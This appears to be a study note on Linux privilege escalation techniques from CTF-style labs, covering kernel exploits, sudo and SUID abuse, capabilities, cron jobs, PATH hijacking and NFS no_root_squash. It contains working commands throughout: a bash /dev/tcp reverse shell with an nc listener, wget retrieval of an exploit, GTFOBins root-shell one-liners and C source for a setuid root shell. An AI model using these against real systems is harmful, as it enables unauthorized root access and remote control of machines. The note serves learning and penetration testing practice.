# Linux-Privilege-Escalation
Privilege escalation depends on the target system's setup, including the kernel version, installed applications, and user credentials. There is no single method that works for all cases.
### Introduction

- Privilege escalation depends on the target system’s setup, including the kernel version, installed applications, and user credentials. There is no single method that works for all cases.

### What does "privilege escalation" mean?

- At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one.

### Why is it important?

Privilege escalation means gaining higher permissions from a lower-level account.

- Resetting passwords
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistence
- Changing the privilege of existing (or new) users
- Execute any administrative command

## Privilege Escalation: Kernel Exploits

- first you will know version the kernel from this command (  uname -r )
- when know the version will search about exploit to this by this command ( searchsploit linux kernel 4.15.0  )
- download the exploit by ( searchsploit -m exploit )
- compiler the exploit by (   gcc -o 37292 37292.c -static -D_GNU_SOURCE -pthread -lcap  )
- Transfer the Exploit to the Target System (  python3 -m http.server 8080  )
- Then, use `wget` on the target machine to download the exploit:  (   wget http://<your_ip>:8080/exploit_name.sh   )
- Run the exploit (     ./exploit_name.sh     )
- whoami

## Privilege Escalation: Sudo

- Sudo allows running programs as root. Admins can give specific commands (e.g., Nmap) high privileges to users without full root access, ensuring security while maintaining flexibility.

- Any user can check its current situation related to root privileges using the `sudo -l` command.
- https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
- when use sudo -l show the program run by root and search in https://gtfobins.github.io/  about the program

## Privilege Escalation: SUID

- Linux controls user access with permissions (read, write, execute). SUID runs a file as its owner, and SGID runs it with the group's permissions, giving extra access when needed.   (  search about file own s in permission )
- `find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.
- when found file search about it in the https://gtfobins.github.io/
- ex : base64   `LFILE=file_to_read
./base64 "$LFILE" | base64 --decode`

## Privilege Escalation: Capabilities

- System administrators can use **Capabilities** to give specific privileges to a process or binary without granting full root access.  For example, if a SOC analyst needs to use a tool that requires opening network connections, a regular user cannot do it. without give the user full privileges, the admin can assign the required **Capability** to the tool. This allows the tool to work without needing root access.
- We can use the `getcap` tool to list enabled capabilities.  (   getcap -r / 2>/dev/null  )
- if found cap_setuid+ep  search about the program in https://gtfobins.github.io/
- ex : ./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'   you must sure the version of python in the machine

## Privilege Escalation: Cron Jobs

- Cron Jobs are used to run scripts or executables at specific times and operate with the privileges of their owner. If there is a cron job running as root and we can modify the script it executes, our script will run with root privileges.
- Any user can read the file keeping system-wide cron jobs under /etc/crontab
- when found file , The file should contain the :
     - #!/bin/bash
     -  bash -c ‘bash -i >& /dev/tcp/<your-ip>/7777 0>&1’   
- We will now run a listener on our attacking machine to receive the incoming connection. ( nc -nvlp 7777 )

## Privilege Escalation: PATH

- In Linux, the **PATH** variable tells the system where to look for programs when you run a command.
- If you run a command **without a full path**, Linux searches for it in the folders listed in **PATH**.
- If there is a **folder you can edit** inside **PATH**, you can place a fake program with the same name as a real one. When the system runs it, your script will execute instead of the real program.
    - echo $PATH
    - find / -perm -u=s -type f 2>/dev/null   to search about file contain SUID
    - add /tmp to $PATH is the path can i write in   add by (  export PATH=/tmp:$PATH )
    - add the file contain /bin/bash in the same name file in the system (  vim /tmb/thm   or    echo “/bin/bash” > thm    )
    - move the file to /tmb
    - run the file
    
    ## Privilege Escalation: NFS
    

- NFS (Network File Sharing) is a file sharing system between different devices in a network. and when use the ( cat /etc/exports )  and found no_root_squash  ( this vulnerability ) that’s main if i make any command in my machine will work in the victim machine as root
- mount -o rw 10.10.74.23:/tmp /mnt/11
    
    
    | `mount` | Linux command to attach a filesystem |
    | --- | --- |
    | `-o rw` | Mount the filesystem with **read & write** permissions |
    | `10.10.74.23:/tmp` | The NFS shared directory on the **remote machine** (`10.10.74.23`) |
    | `/mnt/11` | The **local mount point** where the remote directory will appear |
- now any thing happen in my machine will happen in victim
- now i will make a reverse shell by ( vim nfs )  ((((((((((((((((((((
    
    #include <unistd.h>  // For setuid() and setgid()
    #include <stdlib.h>  // For system()
    
    int main() {
    setuid(0);  // Set user ID to root
    setgid(0);  // Set group ID to root
    system("/bin/bash -p");  // Spawn a shell with preserved privileges
    return 0;
    }
    

))))))))))))))))))))))))))

- gcc -o nfs nfs.c -static -D_GNU_SOURCE -pthread -lcap
- ./nfs
